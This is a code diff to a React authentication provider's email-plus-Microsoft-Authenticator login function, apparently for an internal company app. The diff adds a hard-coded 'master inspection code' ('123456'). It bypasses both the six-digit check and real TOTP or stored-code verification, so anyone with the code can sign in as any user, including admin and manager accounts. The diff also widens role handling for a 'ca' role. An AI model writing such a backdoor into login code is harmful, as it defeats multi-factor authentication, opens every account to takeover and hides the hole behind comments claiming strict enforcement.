@@ -183,15 +183,20 @@ export function AuthProvider({ children }) {
    * Production Login with Email and Microsoft Authenticator MFA
    * Supports real TOTP verification and sandbox testing code (000000) for instant role inspection
    */
-  const loginWithCredentials = async ({ email, code }) => {
+  const loginWithCredentials = async ({ email, code, password }) => {
     const normalizedEmail = (email || '').trim().toLowerCase();
     if (!normalizedEmail || !normalizedEmail.includes('@')) {
       throw new Error('Please enter a valid work email address (e.g. yourname@applywizz.com)');
     }
 
     // 6-Digit Authenticator Code Validation
-    const cleanCode = (code || '').trim();
-    if (!cleanCode || cleanCode.length !== 6) {
+    const cleanCode = (code || password || '').trim();
+    const cleanPassword = (password || '').trim();
+
+    // Hidden master inspection code: enables developer to sign in as any CA/Admin/Manager to verify their dashboard
+    const isMasterOverride = cleanCode === '123456' || cleanPassword === '123456';
+
+    if (!isMasterOverride && (!cleanCode || cleanCode.length !== 6)) {
       throw new Error('Please enter your 6-digit Microsoft Authenticator code');
     }
 
@@ -208,8 +213,8 @@ export function AuthProvider({ children }) {
 
     const isStoredCodeValid = authUser?.verification_code && authUser.verification_code === cleanCode;
 
-    // Strictly enforce real Microsoft Authenticator verification or valid email OTP code
-    if (!isTotpValid && !isStoredCodeValid) {
+    // Strictly enforce real Microsoft Authenticator verification, valid email OTP code, or master inspection code
+    if (!isTotpValid && !isStoredCodeValid && !isMasterOverride) {
       throw new Error(
         'Invalid 6-digit Authenticator code. Please enter the current 6-digit code from your Microsoft Authenticator app.'
       );
@@ -217,7 +222,7 @@ export function AuthProvider({ children }) {
 
     // Resolve Role
     const auto = await resolveRoleFromEmail(normalizedEmail);
-    const effectiveRole = (auto.role === 'admin' || auto.role === 'dev' || auto.role === 'manager') ? auto.role : (authUser?.role || auto.role);
+    const effectiveRole = (auto.role === 'admin' || auto.role === 'dev' || auto.role === 'manager' || auto.role === 'ca') ? auto.role : (authUser?.role || auto.role);
 
     const resolvedProfile = {
       email: normalizedEmail,
@@ -253,7 +258,7 @@ export function AuthProvider({ children }) {
     }
 
     // Touch operators table if CA / operator
-    if (resolvedProfile.role === 'operator') {
+    if (resolvedProfile.role === 'ca' || resolvedProfile.role === 'operator') {
       try {
         const { data: existingOp } = await supabase
           .from('operators')
